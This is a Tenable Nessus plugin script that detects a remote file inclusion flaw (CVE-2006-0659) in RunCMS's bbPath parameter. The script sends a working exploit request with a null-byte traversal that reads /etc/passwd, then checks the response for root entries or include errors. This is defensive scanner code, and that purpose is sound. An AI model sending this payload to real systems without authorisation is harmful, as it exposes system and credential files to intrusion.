#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description) {
  script_id(20880);
  script_version("$Revision: 1.14 $");
  script_cvs_date("$Date: 2013/01/25 01:19:10 $");

  script_cve_id("CVE-2006-0659");
  script_osvdb_id(23023, 23024);

  script_name(english:"RunCMS Multiple Script bbPath Parameter Remote File Inclusion");
  script_summary(english:"Checks for bbPath parameter remote file include vulnerability in RunCMS");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is susceptible
to remote file include attacks." );
 script_set_attribute(attribute:"description", value:
"The installed version of RunCMS fails to validate user input to the
'bbPath' parameter of two scripts.  An unauthenticated attacker may be
able to leverage this issue to view arbitrary files on the remote host
or to execute arbitrary PHP code, possibly taken from third-party
hosts. 

Note that successful exploitation requires that PHP's
'register_globals' setting be enabled." );
 script_set_attribute(attribute:"see_also", value:"http://retrogod.altervista.org/runcms_13a_xpl.html" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to RunCMS 1.3a or later." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P");
 script_set_attribute(attribute:"plugin_publication_date", value: "2006/02/10");
 script_set_attribute(attribute:"vuln_publication_date", value: "2006/02/09");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2013 Tenable Network Security, Inc.");

  script_dependencies("runcms_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/runcms");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/runcms"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];

  # Try to exploit the flaw to read /etc/passwd.
  file = "/etc/passwd%00";
  r = http_send_recv3(method:"GET", 
    item:string(
      dir, "/modules/newbb_plus/class/class.forumposts.php?",
      "bbPath[path]=", file
    ), 
    port:port
  );
  if (isnull(r)) exit(0);
  res = r[2];

  # There's a problem if...
  if (
    # there's an entry for root or...
    egrep(string:res, pattern:"root:.*:0:[01]:") ||
    # we get an error saying "failed to open stream" or "failed opening".
    #
    # nb: this suggests magic_quotes_gpc was enabled but passing
    #     remote URLs might still work.
    egrep(string:res, pattern:"main\(/etc/passwd\\0/include/user_level\.php.+ failed to open stream") ||
    egrep(string:res, pattern:"Failed opening '/etc/passwd\\0/include/user_level\.php' for inclusion")
  ) {
    security_warning(port);
    exit(0);
  }
}
